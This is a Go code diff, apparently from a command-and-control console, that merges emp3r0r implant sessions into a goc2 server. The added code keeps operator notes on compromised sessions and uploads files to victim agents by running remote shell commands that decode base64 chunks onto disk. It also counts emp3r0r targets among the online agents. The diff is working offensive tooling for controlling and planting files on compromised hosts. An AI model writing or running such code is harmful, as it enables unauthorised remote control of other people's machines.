@@ -389,6 +389,25 @@ func (s *Server) c2xAgentNote(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "bad id")
 		return
 	}
+	// 融合视图：emp3r0r 会话没有 goc2 的 notes 字段，备注存在进程内（与
+	// /clients 聚合视图同源），避免 UpdateNotes 打到 goc2 报"会话不存在"。
+	if strings.HasPrefix(id, emp3r0rIDPrefix) {
+		if r.Method == "GET" {
+			writeJSON(w, 200, map[string]any{"note": emp3r0rNote(id)})
+			return
+		}
+		var b struct {
+			Note string `json:"note"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
+			writeErr(w, 400, "bad json")
+			return
+		}
+		emp3r0rSetNote(id, truncateStr(b.Note, 500))
+		s.c2Audit(id, "", "note", "emp3r0r")
+		writeJSON(w, 200, map[string]any{"ok": true})
+		return
+	}
 	if r.Method == "GET" {
 		clients, _ := c2Client().ListClients(r.Context(), nil)
 		for _, c := range clients {
@@ -836,6 +855,37 @@ func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
 	}
 	dest = strings.TrimRight(strings.ReplaceAll(dest, "\\", "/"), "/")
 	full := dest + "/" + hdr.Filename
+	// 融合路由：emp3r0r 会话没有 goc2 的 upload 任务类型，用 base64 分块经
+	// run_module exec 落盘（每块 256KB，与 goc2 分块一致，避免命令行过长）。
+	if strings.HasPrefix(agent, emp3r0rIDPrefix) && emp3r0rEnabled() {
+		tag := strings.TrimPrefix(agent, emp3r0rIDPrefix)
+		q := shellQuote(full)
+		const chunk = 256 * 1024
+		total := (len(data) + chunk - 1) / chunk
+		if total == 0 {
+			writeErr(w, 400, "空文件")
+			return
+		}
+		if _, err := emp3r0rRunWait(r.Context(), tag, ": > "+q, 60*time.Second); err != nil {
+			writeErr(w, 502, "创建失败: "+err.Error())
+			return
+		}
+		for i := 0; i < total; i++ {
+			end := (i + 1) * chunk
+			if end > len(data) {
+				end = len(data)
+			}
+			b64 := base64.StdEncoding.EncodeToString(data[i*chunk : end])
+			cmd := "printf %s " + shellQuote(b64) + " | base64 -d >> " + q
+			if _, err := emp3r0rRunWait(r.Context(), tag, cmd, 60*time.Second); err != nil {
+				writeErr(w, 502, fmt.Sprintf("chunk %d 失败: %v", i, err))
+				return
+			}
+		}
+		s.c2Audit(agent, "", "file_to_agent", fmt.Sprintf("%s → %s (%d chunks)", hdr.Filename, full, total))
+		writeJSON(w, 200, map[string]any{"ok": true, "total": total, "filename": hdr.Filename})
+		return
+	}
 	const chunk = 256 * 1024
 	total := (len(data) + chunk - 1) / chunk
 	for i := 0; i < total; i++ {
@@ -843,7 +893,7 @@ func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
 		if end > len(data) {
 			end = len(data)
 		}
-		arg := map[string]any{"path": full, "data": base64.StdEncoding.EncodeToString(data[i*chunk:end])}
+		arg := map[string]any{"path": full, "data": base64.StdEncoding.EncodeToString(data[i*chunk : end])}
 		if _, err := c2Client().EnqueueTask(r.Context(), agent, "upload", arg); err != nil {
 			writeErr(w, 502, fmt.Sprintf("chunk %d 失败: %v", i, err))
 			return
@@ -894,6 +944,10 @@ func (s *Server) c2xStats(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		writeErr(w, 502, err.Error())
 		return
+	}
+	// 融合视图：emp3r0r 目标计入统计（否则状态栏显示 0 在线）。
+	if emp3r0rEnabled() {
+		clients = append(clients, emp3r0rListClients()...)
 	}
 	total, online, idle, offline := 0, 0, 0, 0
 	for _, c := range clients {
@@ -1044,10 +1098,10 @@ func (s *Server) c2xProcList(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	type proc struct {
-		PID   string `json:"pid"`
-		Name  string `json:"name"`
-		Mem   string `json:"mem"`
-		Cmd   string `json:"cmd,omitempty"`
+		PID  string `json:"pid"`
+		Name string `json:"name"`
+		Mem  string `json:"mem"`
+		Cmd  string `json:"cmd,omitempty"`
 	}
 	procs := []proc{}
 	for _, ln := range strings.Split(out, "\n") {
@@ -1076,7 +1130,12 @@ func (s *Server) c2xProcList(w http.ResponseWriter, r *http.Request) {
 
 var procCSVRe = regexp.MustCompile(`^"([^"]+)","(\d+)","[^"]*","\d+","([^"]*)"$`)
 
-func c2xMin(a, b int) int { if a < b { return a }; return b }
+func c2xMin(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
 
 // c2xProcKill 进程终止。
 func (s *Server) c2xProcKill(w http.ResponseWriter, r *http.Request) {
